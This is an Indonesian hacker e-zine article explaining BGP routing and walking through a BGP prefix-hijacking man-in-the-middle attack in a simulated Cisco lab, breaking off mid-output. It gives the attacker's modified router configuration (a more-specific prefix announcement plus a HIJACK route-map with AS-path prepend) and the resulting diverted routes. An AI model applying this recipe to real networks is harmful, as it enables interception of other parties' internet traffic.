@@ -1,0 +1,997 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Border Gateway Protocol (BGP) Internet Man in The Middle 
+Writer    : Straw Hat Pirates of BytesKrew
+Contact   : Straw Hat Pirates Can't Be Contacted
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Introduction
+
+Komputer saling terhubung di internet membutuhkan proses routing dalam
+komunikasi. Routing dalam komunikasi jaringan komputer didefinisikan
+sebagai pemilihan jalur yang digunakan untuk mengirimkan data dari
+jaringan asal ke jaringan tujuan. Piranti yang digunakan dalam proses
+routing disebut dengan router. Pada router terdapat tabel routing yang
+berisi alamat jaringan dan alamat IP address router berikutnya yang
+dibutuhkan untuk menuju tujuan.
+
+Berdasarkan pada bagaimana tabel routing dalam sebuah router terupdate,
+routing dikelompokkan menjadi routing statik dan routing dinamik. Pada
+routing statik tabel routingnya diupdate secara manual oleh pengelola
+jaringan. Sedangkan pada routing dinamik tabel routingnya terupdate
+secara otomatis dengan memanfaatkan protokol-protokol routing. Protokol
+routing menggunakan algoritma tertentu dalam pemilihan jalur paket data.
+Secara umum protokol routing terbagi dalam dua jenis yaitu:
+
+ - Interior Gateway Protocols (IGP)
+ - Exterior Gateway Protocols (EGP)
+
+Interior Gateway Protocols (IGP) adalah jenis protokol routing yang
+memberikan pertukaran informasi routing dalam sebuah Autonomous System
+(AS). Yang termasuk dalam protokol IGP adalah sebagai berikut:
+
+ - Interior Gateway Routing Protocol (IGRP)
+ - Enhanced Interior Gateway Routing Protocol (EIGRP)
+ - Open Shortest Path First (OSPF)
+ - Routing Information Protocol (RIP)
+ - Intermediate System to Intermediate System (IS-IS)
+
+Exterior Gateway Protocols (EGP) adalah jenis protokol routing yang
+digunakan untuk memberikan pertukaran informasi routing antar Autonomous
+System (AS) yang berbeda. Yang termasuk dalam protokol EGP adalah
+sebagai berikut:
+
+ - Exterior Gateway Protocol (EGP)
+ - Border Gateway Protocol (BGP)
+
+Protokol BGP merupakan protokol yang digunakan untuk keperluan backbone
+routing internet. Sampai saat ini protokol BGP merupakan protokol BGP
+versi 4.
+
+
+--[3]-- Understanding How BGP Works
+
+Border Gateway Protocol (BGP) merupakan protokol routing antar
+Autonomous System (AS). Autonomous System (AS), mengacu pada dokumen
+IETF RFC 1930 [i], didefinisikan sebagai kumpulan router-router pada 
+satu pengelolaan administrative yang menggunakan IGP sebagai protokol 
+routing dalam AS tersebut dan menggunakan EGP sebagai protokol routing
+ke AS lain. Nomor AS dimulai dari 1 sampai 65535 dengan catatan nomor AS
+64512 sampai 65535 digunakan sebagai nomor AS private.
+
+Walaupun BGP merupakan protokol routing EGP yang merouting paket data
+antar AS tetapi BGP juga mendukung proses routing paket data dalam sebuah
+AS. Berdasar pada nomor AS yang digunakan dalam proses routing, BGP
+dikategorikan menjadi dua yaitu:
+
+ - Internal BGP (iBGP) merupakan proses pertukaran informasi routing
+   dalam sebuah AS.
+ - Eksternal BGP (eBGP) merupakan proses pertukaran informasi routing
+   BGP antar router-router di internet yang berbeda AS.
+
+BGP merupakan protokol routing yang memanfaatkan TCP port 179 untuk
+pertukaran informasi routing antar router. Untuk mendalami protokol BGP
+silakan mengacu pada dokumen IETF RFC 1771 [ii]. Pada tulisan ini, kami 
+hanya membahas parameter apa saja yang digunakan oleh BGP untuk mengambil
+keputusan routing. BGP menggunakan beberapa parameter dalam mengambil
+keputusan jalur mana yang dipakai untuk mengirimkan data yaitu [iii]:
+
+ - Weight, merupakan parameter dari router itu sendiri mengenai routing
+   mana yang hendak dipilih. Weight diberikan ke sebuah router dan hanya
+   digunakan pada router itu sendiri. Semakin tinggi nilai weight dari
+   sebuah router maka semakin baik jalur routing melalui router
+   tersebut.
+ - Local Preference, merupakan parameter lain yang digunakan dalam
+   pemilihan jalur routing. Berbeda dengan weight yang hanya digunakan
+   sendiri oleh router, local preference digunakan bersama antar router
+   iBGP tetapi tidak dapat digunakan secara bersama pada router eBGP.
+   Default nilai local preference adalah 100, semakin tinggi nilai local
+   preference menunjukkan semakin baiknya jalur routing tersebut.
+ - Multi-Exit Descriminator (MED), menggambarkan kondisi jalur yang kita
+   miliki ke router eksternal. Lain halnya dengan weight dan local
+   preference, MED meninggalkan jaringan kita dan menceritakan ke
+   neighbor jalur routing mana yang ingin kita gunakan. Default nilai
+   MED adalah 0, semakin kecil nilai MED menunjukkan semakin baiknya
+   jalur routing.
+ - Origin, merupakan gambaran sebuah jalur routing berasal dari protokol
+   IGP, EGP, atau redistribusi dari protokol lain. Origin dari protokol
+   IGP memiliki nilai 0, protokol EGP memiliki nilai 1, sedangkan hasil
+   redistribusi dari protokol lain dianggap incomplete dan memiliki
+   nilai origin 2.
+ - AS-PATH, jalur routing BGP berdasarkan pada daftar autonomous system
+   yang harus dilewati untuk mencapai sebuah alamat tujuan. Jalur
+   routing yang dipilih adalah jalur routing dengan AS-PATH paling
+   pendek. Dengan AS-PATH memungkinkan BGP mendeteksi adanya routing
+   loop.
+
+BGP hanya memilih sebuah jalur routing untuk mencapai sebuah alamat
+tujuan. Jalur routing ini ditambahkan ke dalam tabel routing dan
+didistribusikan ke BGP peers (neighbor). Secara umum, pemilihan jalur
+routing oleh BGP bisa dideskripsikan sebagai berikut [iii]:
+
+ - Hapus jalur routing sesegera mungkin jika diketahui next-hop tidak
+   bisa dicapai (unreachable).
+ - Jika diketahui ada dua atau lebih jalur dengan weight yang berbeda,
+   pilih jalur routing dengan nilai weight tertinggi.
+ - Jika semua jalur tersebut memiliki weight yang sama, pilihlah jalur
+   dengan nilai local preference paling tinggi.
+ - Jika semua jalur routing tersebut memiliki local preference yang
+   sama, pilihlah jalur routing yang menggunakan protokol BGP.
+ - Jika semua jalur tersebut tidak menggunakan BGP atau menggunakan BGP
+   semua, pilihlah jalur routing yang memiliki AS-PATH paling pendek.
+ - Jika semua jalur itu memiliki panjang AS-PATH yang sama, pilihlah
+   jalur routing dengan nilai origin paling rendah.
+ - Jika semua jalur tersebut memiliki nilai origin yang sama, pilihlah
+   jalur dengan nilai MED terendah.
+ - Jika semua jalur routing masih sama, maka pilihlah jalur routing yang
+   paling dekat dengan neighbor IGP.
+ - Jika ukuran jarak ke neighbor IGP terdekat masih juga sama, pilihlah
+   router dengan ID paling kecil. ID sebuah router adalah alamat IP yang
+   diberikan pada interface loopback atau alamat IP tertinggi yang
+   berada pada sebuah interface aktif pada saat booting.
+
+BGP memilih jalur berdasar pada aturan tersebut di atas, sedangkan untuk
+routing pada umumnya jaringan dengan prefix yang lebih spesifik lebih
+dipilih dibandingkan jaringan yang lebih besar. Misalnya jaringan 
+10.0.0.0/24 lebih dipilih dibandingkan jaringan 10.0.0.0/16.
+
+
+--[4]-- Review BGP [In]security
+
+BGP telah cukup lama diketahui memiliki banyak celah keamanan pada
+implementasi. Bahkan ada sebuah RFC tersendiri yang membahas mengenai
+celah keamanan pada BGP yaitu RFC 4272[iv]. Celah keamanan BGP banyak
+terkait dengan kelemahan protokol TCP yang digunakan sebagai media
+komunikasi pertukaran informasi routing. Selain itu celah keamanan BGP
+juga terkait dengan pesan (message) yang digunakan dalam pertukaran
+informasi routing dimana pesan tersebut sangat mungkin dipalsukan.
+Secara umum serangan pada kerja BGP, mengacu pada RFC 4272, bisa 
+dikategorikan sebagai berikut:
+
+ - Pelanggaran confidentiality, hal ini karena BGP mempertukarkan
+   informasi dalam bentuk cleartext.
+ - Replay attack, hal ini karena BGP tidak menyediakan mekanisme untuk
+   mencegah terjadinya replay attack.
+ - BGP message modification, meliputi message insertion, message
+   deletion, message modification.
+ - Denial of Service, serangan pada BGP yang memungkinkan untuk
+   mematikan ketersediaan akses jaringan. 
+
+--[4.1]-- Vulnerability pada BGP Messages
+
+Mengacu pada dokumen RFC 1771, pertukaran informasi routing BGP
+menggunakan empat jenis BGP messages yaitu: OPEN, UPDATE, NOTIFICATION,
+dan KEEPALIVE. Saya tidak hendak menulis ulang apa yang sudah ada pada
+RFC 4272 mengenai  vulnerability pada BGP messages. Silakan anda mengacu
+pada pembahasan 3.1.
+
+--[4.2]-- Vulnerability melalui protokol lain
+
+BGP memanfaatkan TCP port 179, protokol TCP sendiri memiliki cukup
+banyak well-known vulnerability pada TCP messagesnya. TCP SYN, SYN-ACK,
+ACK, RST, FIN, FIN-ACK bisa dimanfaatkan untuk mengganggu koneksi antar
+peer router BGP. Untuk lebih lengkapnya silakan mengacu pada RFC 4272
+pembahasan 3.2.
+
+--[4.3]-- Vulnerability yang lain.
+
+Selain bisa dieksploitasi melalui BGP messages dan TCP messages, cara
+kerja wajar dari BGP juga bisa dimanfaatkan untuk melakukan traffic
+redirection. Sebuah celah keamanan pada cara kerja BGP di presentasikan
+oleh Alex Pilosov dan Tony Kapela pada Defcon 16 Las Vegas bulan Agustus
+2008 lalu. Mereka mempresentasikan bahwa dengan memanfaatkan prefix
+jaringan dan AS-PATH bisa digunakan untuk membelokkan routing yang
+bermanfaat untuk melakukan man in the middle[v]. Pada artikel ini
+pembahasan sampai detail teknis hanya pada celah kelemahan ini.
+
+--[4.4]-- Known public BGP exploit
+
+Sebagai wacana tambahan ada beberapa advisories dan public exploit
+memanfaatkan celah keamanan pada standar BGP (bukan pada software) 
+diantaranya:
+
+ - http://www.securityfocus.com/bid/28999, BGP Update message DoS
+ - http://www.securityfocus.com/bid/10183, TCP ISN Approximation
+
+Pada BID 28999, BGP update message bisa dimanfaatkan untuk melakukan
+denial of service. Pada BID 10183, seorang bisa memanfaatkan ISN yang
+bisa diprediksi untuk mengirimkan TCP RST valid untuk memutuskan koneksi
+peer BGP sehingga tidak terjadi pertukaran informasi routing.
+
+
+--[5]-- BGP Internet Man in The Middle
+
+Seperti dibahas pada sub 4.3, sebuah celah keamanan BGP dengan
+memanfaatkan cara kerja normalnya, bisa diexploitasi untuk melakukan man 
+in the middle antar router di internet. Dari presentasi Alex Pilosov dan 
+Tony Kapela diketahui bahwa celah keamanan ini bisa dimanfaatkan oleh 
+pihak tidak bertanggung jawab untuk:
+
+ - Melakukan intercept traffic inbound menuju jaringan kita.
+ - Melakukan intercept traffic outbound dari jaringan kita menuju
+   jaringan tertentu.
+ - Traffic data tersebut bisa disimpan, difilter, didrop, bahkan di
+   modifikasi.
+
+Beberapa kejadian terkait dengan insiden hijack routing ini juga 
+dipresentasikan pada Defcon 16. Man in the middle antar router BGP bisa 
+dilakukan dengan memanfaatkan karakter dasar routing bahwa jaringan 
+yang lebih spesifik lebih dipilih dari pada jaringan yang lebih besar. 
+Misalnya jaringan 10.0.0.0/24 lebih dipilih dari 10.0.0.0/16. 
+
+Kombinasi karakter dasar routing ini dengan beberapa parameter BGP bisa
+digunakan oleh pihak yang tidak bertanggung jawab untuk melakukan man in
+the middle antar router di internet. Cara yang digunakan oleh Alex
+Pilosov dan Tony Kapela sebagai berikut:
+
+ - Gunakan traceroute untuk mengetahui router mana saja yang dilalui 
+   dalam mencapai sebuah alamat tujuan (jaringan) tertentu.
+ - Hasil traceroute digunakan untuk merencanakan path mana saja yang
+   harus dilalui oleh paket data dari target yang dihijack.
+ - Announce jaringan tujuan dengan prefix yang lebih spesifik. Berikan
+   route map pada proses announcement ini. (RTFM route-map)
+ - Gunakan AS-PATH prepend pada BGP, berikan nilai AS number sesuai
+   rencana path yang harus dilalui. (RTFM as-path prepend)
+ - Buatlah routing statik untuk menuju jaringan yang di-announce pada
+   langkah 3 melalui hop berikutnya.
+ - Selesai.
+
+Untuk memberikan gambaran lebih mendetail mengenai konsep di atas, 
+berikut ini penjelasan bagaimana secara teknis melakukan man in the 
+middle antar router BGP.
+
+--[5.1]-- 1st Scenario
+
+Skenario satu, percobaan menggunakan 5 buah Cisco IOS 2610 berjalan pada
+dynamips dengan topologi jaringan sebagai berikut:
+
+
+(a)..........(b)..(c)..................(d)              
+|RLAN|--------|AS10|------------------|AS20|
+.............(g)|                       | (e)
+                |                       |
+                |                       |
+                |                       |
+.............(h)|                       | (f)
+              |AS30|------------------|AS40|
+..................(i)................(j)
+
+
+Keterangan :
+
+(a) 8.1.1.2/8   (f) 5.5.5.2/30
+(b) 8.1.1.1/8   (g) 3.3.3.1/30
+(c) 2.2.2.1/30  (h) 3.3.3.2/30
+(d) 2.2.2.2/30  (i) 4.4.4.1/30
+(e) 5.5.5.1/30  (j) 4.4.4.2/30
+
+---- atau |	= konektivitas
+....		= Garis bantu
+
+
+Pada topologi ini, diassumsikan bahwa attacker telah berhasil menguasai
+router dengan nomor AS 20. Attacker menginginkan traffic data dari
+router dengan nomor AS 30 dan AS 40 menuju jaringan 8.1.1.1/8 pada
+router dengan nomor AS 10 melalui router dengan nomor AS 20.
+
+--[5.1.1]-- Kondisi Normal
+
+Pada kondisi normal, router dengan AS 10 membuat announcement jaringan
+8.0.0.0/8. Semua traffic data menuju jaringan 8.0.0.0/8 pada router 
+dengan nomor AS 10 berjalan normal. Konfigurasi BGP untuk masing-masing 
+router sebagai berikut:
+
+-----------------------------------------------------------------------
+
+router bgp 10
+ network 2.2.2.0 mask 255.255.255.252
+ network 3.3.3.0 mask 255.255.255.252
+ network 8.0.0.0
+ neighbor 2.2.2.2 remote-as 20
+ neighbor 3.3.3.2 remote-as 30
+
+router bgp 20
+ network 2.2.2.0 mask 255.255.255.252
+ network 5.5.5.0 mask 255.255.255.252
+ neighbor 2.2.2.1 remote-as 10
+ neighbor 5.5.5.2 remote-as 40
+
+router bgp 30
+ network 3.3.3.0 mask 255.255.255.252
+ network 4.4.4.0 mask 255.255.255.252
+ neighbor 3.3.3.1 remote-as 10
+ neighbor 4.4.4.2 remote-as 40
+
+router bgp 40
+ network 4.4.4.0 mask 255.255.255.252
+ network 5.5.5.0 mask 255.255.255.252
+ neighbor 4.4.4.1 remote-as 30
+ neighbor 5.5.5.1 remote-as 20
+
+-----------------------------------------------------------------------
+
+Sebagai catatan, konfigurasi di atas dibuat sesederhana mungkin tanpa
+adanya proses hardening pada konfigurasi BGP. Kecerobohan konfigurasi
+BGP seperti inilah yang menyebabkan mungkinnya dilakukan man in the
+middle antar router di internet.
+
+Pada kondisi normal, berikut ini tabel routing pada router dengan nomor
+AS 30 dan AS 40 beserta hasil traceroute menuju 8.1.1.2.
+
+-----------------------------------------------------------------------
+
+--[i]-- Router AS 30
+
+AS30#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     2.0.0.0/30 is subnetted, 1 subnets
+B       2.2.2.0 [20/0] via 3.3.3.1, 00:12:18
+     3.0.0.0/30 is subnetted, 1 subnets
+C       3.3.3.0 is directly connected, Ethernet0/0
+     4.0.0.0/30 is subnetted, 1 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+     5.0.0.0/30 is subnetted, 1 subnets
+B       5.5.5.0 [20/0] via 4.4.4.2, 00:12:16
+B    8.0.0.0/8 [20/0] via 3.3.3.1, 00:12:18
+AS30#traceroute 8.1.1.2
+
+Type escape sequence to abort.
+Tracing the route to 8.1.1.2
+
+  1 3.3.3.1 4 msec 0 msec 12 msec
+  2 8.1.1.2 [AS 10] 20 msec 12 msec * 
+AS30#
+
+
+--[ii]-- Router AS 40
+
+AS40#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     2.0.0.0/30 is subnetted, 1 subnets
+B       2.2.2.0 [20/0] via 5.5.5.1, 00:05:24
+     3.0.0.0/30 is subnetted, 1 subnets
+B       3.3.3.0 [20/0] via 4.4.4.1, 00:14:21
+     4.0.0.0/30 is subnetted, 1 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+     5.0.0.0/30 is subnetted, 1 subnets
+C       5.5.5.0 is directly connected, Ethernet0/0
+B    8.0.0.0/8 [20/0] via 4.4.4.1, 00:14:20
+AS40#traceroute 8.1.1.2
+
+Type escape sequence to abort.
+Tracing the route to 8.1.1.2
+
+  1 4.4.4.1 4 msec 8 msec 4 msec
+  2 3.3.3.1 [AS 30] 16 msec 16 msec 8 msec
+  3 8.1.1.2 [AS 10] 36 msec 12 msec * 
+AS40#
+
+-----------------------------------------------------------------------
+
+Pada kondisi ini traffic data berjalan dengan routing normal. Proses
+routing normal ini juga berlaku untuk router yang lain.
+
+--[5.1.2]-- Kondisi Man In the Middle
+
+Ketika attacker menginginkan Man In the Middle antar router tesebut,
+maka attacker membuat announcement palsu jaringan 8.0.0.0/8 dengan
+prefix lebih spesifik. Prefix yang dipilih tentunya sesuai dengan
+keinginan attacker, misalnya attacker membuat announcement palsu pada
+router dengan nomor AS 20 untuk jaringan 8.1.1.0/24. Attacker
+selanjutnya membuat routing untuk menuju jaringan 8.1.1.0/24 secara
+statik melalui router dengan nomor AS 10 (Alamat IP 2.2.2.1). Terakhir
+attacker mengatur AS-PATH menuju 8.1.1.0/24 melalui nomor AS 10.
+
+Konfigurasi pada router dengan nomor AS 20 setelah dimodifikasi oleh
+attacker dalam proses Man In the Middle sebagai berikut:
+
+-----------------------------------------------------------------------
+
+router bgp 20
+ network 2.2.2.0 mask 255.255.255.252
+ network 5.5.5.0 mask 255.255.255.252
+ network 8.1.1.0 mask 255.255.255.0
+ neighbor 2.2.2.1 remote-as 10
+ neighbor 2.2.2.1 prefix-list ANN out
+ neighbor 5.5.5.2 remote-as 40
+ neighbor 5.5.5.2 prefix-list JACKED out
+ neighbor 5.5.5.2 route-map HIJACK out
+!
+ip classless
+ip route 8.1.1.0 255.255.255.0 2.2.2.1
+no ip http server
+!
+!
+ip prefix-list ANN seq 10 permit 2.2.2.0/30
+ip prefix-list ANN seq 15 permit 5.5.5.0/30
+!
+ip prefix-list JACKED seq 10 permit 8.1.1.0/24
+ip prefix-list JACKED seq 15 permit 2.2.2.0/30
+ip prefix-list JACKED seq 20 permit 5.5.5.0/30
+route-map HIJACK permit 10
+ set as-path prepend 10
+
+-----------------------------------------------------------------------
+
+Dengan konfigurasi ini attacker berhasil membuat traffic data dari
+router AS 30 dab AS 40 menuju 8.1.1.0/24 pada router AS 10 melalui 
+router dengan AS 20. Berikut tabel routing pada router AS 30 dan 
+AS 40 beserta hasil traceroute menuju 8.1.1.2.
+
+-----------------------------------------------------------------------
+
+--[i]-- Router AS 30
+
+AS30#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     2.0.0.0/30 is subnetted, 1 subnets
+B       2.2.2.0 [20/0] via 3.3.3.1, 00:00:13
+     3.0.0.0/30 is subnetted, 1 subnets
+C       3.3.3.0 is directly connected, Ethernet0/0
+     4.0.0.0/30 is subnetted, 1 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+     5.0.0.0/30 is subnetted, 1 subnets
+B       5.5.5.0 [20/0] via 4.4.4.2, 00:00:11
+     8.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
+B       8.1.1.0/24 [20/0] via 4.4.4.2, 00:00:11
+B       8.0.0.0/8 [20/0] via 3.3.3.1, 00:00:13
+AS30#traceroute 8.1.1.2
+
+Type escape sequence to abort.
+Tracing the route to 8.1.1.2
+
+  1 4.4.4.2 4 msec 4 msec 4 msec
+  2 5.5.5.1 [AS 40] 12 msec 12 msec 12 msec
+  3 2.2.2.1 [AS 10] 20 msec 36 msec 29 msec
+  4 8.1.1.2 [AS 10] 16 msec 12 msec * 
+AS30#
+
+
+--[ii]-- Router AS 40
+
+AS40#sh ip ro
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     2.0.0.0/30 is subnetted, 1 subnets
+B       2.2.2.0 [20/0] via 5.5.5.1, 00:03:19
+     3.0.0.0/30 is subnetted, 1 subnets
+B       3.3.3.0 [20/0] via 4.4.4.1, 00:02:58
+     4.0.0.0/30 is subnetted, 1 subnets
+C       4.4.4.0 is directly connected, Ethernet1/0
+     5.0.0.0/30 is subnetted, 1 subnets
+C       5.5.5.0 is directly connected, Ethernet0/0
+     8.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
+B       8.0.0.0/8 [20/0] via 4.4.4.1, 00:02:58
+B       8.1.1.0/24 [20/0] via 5.5.5.1, 00:03:19
+AS40#traceroute 8.1.1.2
+
+Type escape sequence to abort.
+Tracing the route to 8.1.1.2
+
+  1 5.5.5.1 4 msec 0 msec 8 msec
+  2 2.2.2.1 [AS 10] 12 msec 8 msec 12 msec
+  3 8.1.1.2 [AS 10] 24 msec 16 msec * 
+AS40#
+
+Pada router dengan nomor AS 30 dan AS 40, traffic data menuju 8.1.1.2/24
+melalui router dengan AS 20 (Alamat IP 5.5.5.1).
+
+-----------------------------------------------------------------------
+
+--[5.2]-- 2nd Scenario
+
+Skenario ini diambil dari presentasi Alex Pilosov dan Tony Kapela,
+diujikan menggunakan 9 buah Cisco IOS 2610 berjalan pada dynamips dengan
+topologi jaringan sebagai berikut:
+
+	/------------(e)|AS20|(g)------------------(l)|AS10|
+	|................/(f)				|(m)
+	|.............../				|
+	|		|				|
+....(b)/		|(i)				|(n)
+ |AS200|(c)-------(h)|AS30|(j)-----(q)|AS40|(r)-----(p)|AS100|
+..(a)/			|(k)		|(s)		|(o)
+..../			|		|		|
+.../			|		|		|
+../(d)			|(w)		|(t)		|
+|RLAN|...............|AS50|(x)-----(v)|AS60|(u)----------		
+
+
+Keterangan :
+
+(a) 10.10.220.1/22	(i) 1.2.3.1/24	(q) 6.6.6.1/24
+(b) 2.2.2.2/24		(j) 6.6.6.2/24	(r) 2.2.4.2/24
+(c) 3.3.3.2/24		(k) 1.2.4.1/24	(s) 2.2.3.2/24
+(d) 10.10.220.2/22	(l) 5.5.5.1/24	(t) 2.2.4.1/24
+(e) 2.2.2.1/24		(m) 4.3.2.1/24	(u) 5.4.3.1/24
+(f) 1.2.3.2/24		(n) 4.3.2.2/24	(v) 4.4.4.1/24
+(g) 5.5.5.2/24		(o) 5.4.3.2/24	(w) 1.2.4.2/24
+(h) 3.3.3.1/24		(p) 2.2.4.1/24	(x) 4.4.4.2/24
+
+---- atau |     = konektivitas
+....            = Garis bantu
+
+
+Pada topologi ini, diassumsikan bahwa attacker telah berhasil menguasai
+router dengan nomor AS 100. Attacker menginginkan traffic data dari
+router dengan nomor AS 30, AS 40, AS 50, dan AS 60 menuju jaringan
+10.10.220.0/22 pada router dengan nomor AS 200 melalui router dengan 
+nomor AS 100.
+
+--[5.2.1]-- Kondisi Normal
+
+Pada kondisi normal, router dengan AS 200 membuat announcement jaringan
+10.10.220.0/22. Semua traffic data menuju jaringan 10.10.220.0/22 pada 
+router dengan nomor AS 200 berjalan normal. Konfigurasi BGP untuk
+masing-masing router sebagai berikut:
+
+-----------------------------------------------------------------------
+
+router bgp 10
+ network 4.3.2.0 mask 255.255.255.0
+ network 5.5.5.0 mask 255.255.255.0
+ neighbor 4.3.2.2 remote-as 100
+ neighbor 5.5.5.2 remote-as 20
+
+router bgp 20
+ network 1.2.3.0 mask 255.255.255.0
+ network 2.2.2.0 mask 255.255.255.0
+ network 5.5.5.0 mask 255.255.255.0
+ neighbor 1.2.3.1 remote-as 30
+ neighbor 2.2.2.2 remote-as 200
+ neighbor 5.5.5.1 remote-as 10
+
+router bgp 30
+ network 1.2.3.0 mask 255.255.255.0
+ network 1.2.4.0 mask 255.255.255.0
+ network 3.3.3.0 mask 255.255.255.0
+ network 6.6.6.0 mask 255.255.255.0
+ neighbor 1.2.3.2 remote-as 20
+ neighbor 1.2.4.2 remote-as 50
+ neighbor 3.3.3.2 remote-as 200
+ neighbor 6.6.6.1 remote-as 40
+
+router bgp 40
+ network 2.2.3.0 mask 255.255.255.0
+ network 2.2.4.0 mask 255.255.255.0
+ network 6.6.6.0 mask 255.255.255.0
+ neighbor 2.2.3.1 remote-as 60
+ neighbor 2.2.4.1 remote-as 100
+ neighbor 6.6.6.2 remote-as 30
+
+router bgp 50
+ network 1.2.4.0 mask 255.255.255.0
+ network 4.4.4.0 mask 255.255.255.0
+ neighbor 1.2.4.1 remote-as 30
+ neighbor 4.4.4.1 remote-as 60
+
+router bgp 60
+ network 2.2.3.0 mask 255.255.255.0
+ network 4.4.4.0 mask 255.255.255.0
+ network 5.4.3.0 mask 255.255.255.0
+ neighbor 2.2.3.2 remote-as 40
+ neighbor 4.4.4.2 remote-as 50
+ neighbor 5.4.3.2 remote-as 100
+
+router bgp 100
+ network 2.2.4.0 mask 255.255.255.0
+ network 4.3.2.0 mask 255.255.255.0
+ network 5.4.3.0 mask 255.255.255.0
+ neighbor 2.2.4.2 remote-as 40
+ neighbor 4.3.2.1 remote-as 10
+ neighbor 5.4.3.1 remote-as 60
+
+router bgp 200
+ network 2.2.2.0 mask 255.255.255.0
+ network 3.3.3.0 mask 255.255.255.0
+ network 10.10.220.0 mask 255.255.252.0
+ neighbor 2.2.2.1 remote-as 20
+ neighbor 3.3.3.1 remote-as 30
+
+-----------------------------------------------------------------------
+
+Sebagai catatan, konfigurasi di atas dibuat sesederhana mungkin tanpa
+adanya proses hardening pada konfigurasi BGP. Kecerobohan konfigurasi
+BGP seperti inilah yang menyebabkan mungkinnya dilakukan man in the
+middle antar router di internet.
+
+Pada kondisi normal, berikut ini tabel routing pada router dengan nomor
+AS 30 dan AS 60 beserta hasil traceroute menuju 10.10.220.2.
+
+-----------------------------------------------------------------------
+
+--[i]-- Router AS 30
+
+AS30#sh ip ro        
+Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
+       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
+       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area
+       * - candidate default, U - per-user static route, o - ODR
+       P - periodic downloaded static route
+
+Gateway of last resort is not set
+
+     1.0.0.0/24 is subnetted, 2 subnets
+C       1.2.3.0 is directly connected, Ethernet1/0
+C       1.2.4.0 is directly connected, Ethernet1/1
+     2.0.0.0/24 is subnetted, 3 subnets
+B       2.2.2.0 [20/0] via 1.2.3.2, 02:46:31
+B       2.2.3.0 [20/0] via 6.6.6.1, 05:08:02
+B       2.2.4.0 [20/0] via 6.6.6.1, 05:08:02
+     3.0.0.0/24 is subnetted, 1 subnets
+C       3.3.3.0 is directly connected, Ethernet0/0
+     4.0.0.0/24 is subnetted, 2 subnets
+B       4.4.4.0 [20/0] via 1.2.4.2, 05:08:02
+B       4.3.2.0 [20/0] via 1.2.3.2, 05:07:58
+     5.0.0.0/24 is subnetted, 2 subnets
+B       5.4.3.0 [20/0] via 6.6.6.1, 05:07:34
+B       5.5.5.0 [20/0] via 1.2.3.2, 05:07:58
+     6.0.0.0/24 is subnetted, 1 subnets
+C       6.6.6.0 is directly connected, Ethernet1/2
+     10.0.0.0/22 is subnetted, 1 subnets
+B       10.10.220.0 [20/0] via 3.3.3.2, 02:39:41
+AS30#traceroute 10.10.220.2
+
+Type escape sequence to abort.
